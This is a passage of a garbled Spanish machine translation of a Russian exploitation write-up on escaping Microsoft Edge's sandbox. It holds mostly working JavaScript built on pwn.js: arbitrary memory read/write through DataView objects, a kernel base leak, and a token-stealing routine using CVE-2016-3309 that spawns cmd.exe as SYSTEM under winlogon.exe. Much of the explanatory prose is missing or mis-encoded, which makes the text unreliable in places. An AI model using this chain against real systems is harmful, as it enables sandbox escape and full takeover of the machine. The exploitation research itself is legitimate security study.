protecci√≥n complica enormemente el proceso de operaci√≥n.  Por eso, no podemos llamar a archivos ejecutables de terceros ni acceder a informaci√≥n confidencial del usuario en la memoria o en los discos.  Sin embargo, esta protecci√≥n se puede superar mediante el uso de vulnerabilidades en la implementaci√≥n del entorno limitado de AppContainer o aumentando los privilegios mediante la explotaci√≥n de vulnerabilidades en el n√∫cleo del sistema operativo. </p><br><p>  Vale la pena se√±alar que <code>Microsoft</code> tiene un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">programa de recompensa</a> por separado para t√©cnicas para eludir <code>security mitigation</code> tecnolog√≠as de <code>security mitigation</code> .  El programa indica que la reutilizaci√≥n de c√≥digo ejecutable (la construcci√≥n de cadenas <code>ROP</code> es una variaci√≥n de esta t√©cnica) no se incluye en el programa, porque  Es un tema arquitect√≥nico. </p><br><h3 id="ispolzovanie-pwnjs">  Usando pwn.js </h3><br><p>  De un an√°lisis de todas las tecnolog√≠as de seguridad, se deduce que para poder ejecutar c√≥digo arbitrario, debe omitir el <code>AppContainer</code> limitado de <code>AppContainer</code> .  En este art√≠culo, describimos un m√©todo que utiliza una vulnerabilidad en el kernel de <code>Windows</code> .  En este caso, solo podemos usar el c√≥digo <code>JS</code> y las cadenas <code>ROP</code> .  Escribir un exploit para el kernel usando solo cadenas <code>ROP</code> puede ser muy dif√≠cil.  Para simplificar esta tarea, puede encontrar un conjunto de gadgets con los que podr√≠amos llamar los m√©todos <code>WinAPI</code> necesarios.  Afortunadamente, esto ya est√° implementado en la biblioteca <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><code>pwn.js</code></a>  Utiliz√°ndolo, habiendo descrito solo las funciones de lectura y escritura para lectura y escritura arbitrarias, puede obtener una <code>API</code> conveniente para encontrar las funciones necesarias de <code>WinAPI</code> y llamarlas.  <code>pwn.js</code> tambi√©n proporciona una herramienta conveniente para trabajar con valores de 64 bits y punteros y herramientas para trabajar con estructuras. </p><br><p>  Considere un ejemplo simple.  En el paso anterior, obtuvimos una cadena de dos <code>DataView</code> relacionadas.  Para preparar el exploit, debe crear la siguiente clase: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="PWNED"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI ‚Äî   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Final"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  Resumen </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Liu Jin ‚Äî The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Andrew Wesie, Brian Pak ‚Äî 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Natalie Silvanovich ‚Äî The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Natalie Silvanovich ‚Äî Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team ‚Äî cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Quarkslab ‚Äî Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Siberas ‚Äî Kernel Exploitation Case Study ‚Äî "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Saif El-Sherei ‚Äî Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Diego Juarez ‚Äî Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Nicolas A. Economou ‚Äî Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/455594/">https://habr.com/ru/post/455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../455584/index.html">Entrevistas personalizadas con las fuerzas internas de la empresa: desde errores hasta descubrimientos</a></li>
<li><a href="../455586/index.html">Ciclo de conferencias sobre rob√≥tica del profesor Gregor Sch√∂ner, director del Instituto de Neuroinform√°tica (INI) Bochum, Alemania</a></li>
<li><a href="../455588/index.html">C√≥mo educar a tu comunidad para no bailar con una pandereta</a></li>
<li><a href="../455590/index.html">MVCC en PostgreSQL-8. Congelaci√≥n</a></li>
<li><a href="../455592/index.html">Virus que atacan a empresas industriales como una amenaza para la seguridad f√≠sica</a></li>
<li><a href="../455596/index.html">DevConfX :: Gesti√≥n - informes de gerentes en palabras simples</a></li>
<li><a href="../455598/index.html">Actualice urgentemente Exim a 4.92: hay una infecci√≥n activa</a></li>
<li><a href="../455600/index.html">La plataforma 3DEXPERIENCE ayuda a crear el transporte p√∫blico del futuro</a></li>
<li><a href="../455602/index.html">Provocar bloqueos del navegador con fuzzing conductual</a></li>
<li><a href="../455604/index.html">Ansible para administrar la configuraci√≥n de Windows. Historia de √©xito</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>